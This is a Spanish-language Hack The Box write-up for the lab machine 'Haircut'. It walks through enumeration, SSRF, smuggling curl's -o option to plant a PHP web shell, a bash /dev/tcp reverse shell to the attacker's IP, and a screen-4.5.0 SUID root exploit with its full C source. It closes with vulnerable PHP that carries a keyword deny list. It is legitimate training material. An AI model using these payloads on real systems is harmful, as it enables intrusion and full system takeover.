---
layout: single
title: Haircut - Hack The Box
excerpt: "CTF clásico de HTB, SSRF y busqueda de como explotar un comando SUID en el sistema"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-haircut/haircut1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - SUID binary 
---

# 10.10.10.24 - Haircut
![](/assets/images/htb-haircut/haircut1.png)

------------
# Part 1: Enumeración

Puertos abiertos 22(shh) y 80(http)

```console
└─$ whatweb http://10.10.10.24
HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.24], Title[HTB Hairdresser]

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 'http://10.10.10.24/FUZZ'
000000150:   301        7 L      13 W       194 Ch      "uploads"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'http://10.10.10.24/FUZZ.php'
000025043:   200        19 L     41 W       446 Ch      "exposed"
```
El fuzzing por subdominios no resuelve.
![](/assets/images/htb-haircut/haircut2.PNG)

**/uploads** -> 403 forbidden
**/exposed.php**

Hay una web que dice que que así "Pon la dirección de la peluquería que te gustaria visitar. Por ejemplo: http://localhost/test.html"
![](/assets/images/htb-haircut/haircut3.PNG)

------------
# Part 2: SSRF

Hay un panel que pone "http://localhost/test.html" y en un iframe nos muestra una foto.
Si por curiosidad buscamos "http://10.10.10.24/test.html" sale la misma foto.

En un iframe la web muestra contenido propio, (es como la máquina forge). Encima al ser localhost, se hace
peticiones a si mismo, por lo que puede mostrar contenido retringido al exterior. Esto se llama "SSRF".

La peticion es ```/POST a /exposed.php con los parametros formurl=http://localhost/test.html&submit=Go```

## Internal Port Discovery

Por http se puede acceder a puertos internos -> http://IP:puerto
```console
└─$ wfuzz -X POST --hw=83,95 -z range,0000-9999 -d "formurl=http://localhost:FUZZ&submit=Go" http://10.10.10.24/exposed.php
000000023:   200        25 L     97 W       898 Ch      "0022"
000000081:   200        29 L     100 W      932 Ch      "0080"
000003307:   200        22 L     92 W       909 Ch      "3306"
```
El puerto 3306 es sql, por lo que habrá una base de datos corriendo en algun lado.

## Fuzzing de subdominios
```console
└─$ wfuzz -X POST -w $(locate subdomains-top1million-5000.txt) -d "formurl=http://FUZZ.localhost&submit=Go" http://10.10.10.24/exposed.php
000000007:   200        22 L     319 W      2340 Ch     "webdisk"
000000003:   200        22 L     319 W      2336 Ch     "ftp"
000000001:   200        22 L     319 W      2336 Ch     "www"
000000006:   200        22 L     307 W      2258 Ch     "smtp"
000000008:   200        22 L     307 W      2257 Ch     "pop"
000000015:   200        22 L     319 W      2335 Ch     "ns"
000000023:   200        22 L     319 W      2338 Ch     "forum"
000000039:   200        22 L     319 W      2337 Ch     "dns2"
000000041:   200        22 L     307 W      2258 Ch     "dns1"
000000038:   200        22 L     307 W      2258 Ch     "demo"
```

Aun así probando con cualquiera de estos se queda colgado.

```console
└─$ wfuzz -X POST --hw=98,53,110 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "formurl=http://localhost/FUZZ/&submit=Go" http://10.10.10.24/exposed.php
000000150:   200        29 L     96 W       966 Ch      "uploads"
000002010:   200        19 L     43 W       471 Ch      "'"  
```
------------
# Part 3: RFI

Si en vez de apuntar al localhost, apuntamos a nuestro servidor ```sudo python3 -m http.server 80``` -> ```http://10.10.14.16```

Intentamos subir un index.html pero no lo ejecuta
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'
```
Como el comando que está ejecutando el servidor es un "curl" (se ve por "% Total % Received % Xferd Average...")

```<?php system($_REQUEST['cmd']); ?>```

Hay una opción en curl para depositar archivos **-o**:
```http://10.10.14.16/cmd.php -o /var/www/html/uploads/cmd.php```

```console
└─$ curl -s "http://10.10.10.24/uploads/cmd.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

└─$ curl -s "http://10.10.10.24/uploads/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261'"
```
------------
# Part 4: En el sistema

Recibimos una shell por el puerto 443.

- Usuarios del Sistema ->  root maria
- SUIDs -> /usr/bin/screen-4.5.0

Hay un exploit para eso:

1. Crea la librería " ./libhax.so"
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```
```console
└─$ gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c 
```

1. Crea el binario rootshell (spawnea una sh manteniendo privilegios, una especie de "bash -p")
```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```
```console
└─$ gcc -o ./rootshell ./rootshell.c
```

Una vez eso se siguen los pasos del exploit
```console
www-data@haircut:/tmp$ curl http://10.10.14.16/libhax.so -O
www-data@haircut:/tmp$ curl http://10.10.14.16/rootshell -O
www-data@haircut:/tmp$ cd /etc
www-data@haircut:/etc$ umask 000
www-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
www-data@haircut:/tmp$ screen -ls
www-data@haircut:/tmp$ ./rootshell
# whoami
root
```

------------
# Extra

El código que hacia el curl
```php
<?php
	if(isset($_POST['formurl'])){
		echo "<p>Requesting Site...</p>";
		$userurl=$_POST['formurl'];   // $usrurl es lo que pasa el usaurio por el panel.
		$naughtyurl=0;			// Flag que ve si la url es "sucia"
		$disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']'); // Caracteres especiales
		foreach($disallowed as $naughty){ 
			if(strpos($userurl,$naughty) !==false){   // Si cada uno de esos caracteres sale en la url, no ejecutamos nada.
				echo $naughty.' is not a good thing to put in a URL';
				$naughtyurl=1;}}
		if($naughtyurl==0){    // Si pasa esta vaga sanitización...
			echo shell_exec("curl ".$userurl." 2>&1");}}    // El sistema le hace un curl
?>
```
Lo de los caracteres es para que no se pueda ejecutar comandos tipo ```curl http://localhost/test.html; whoami```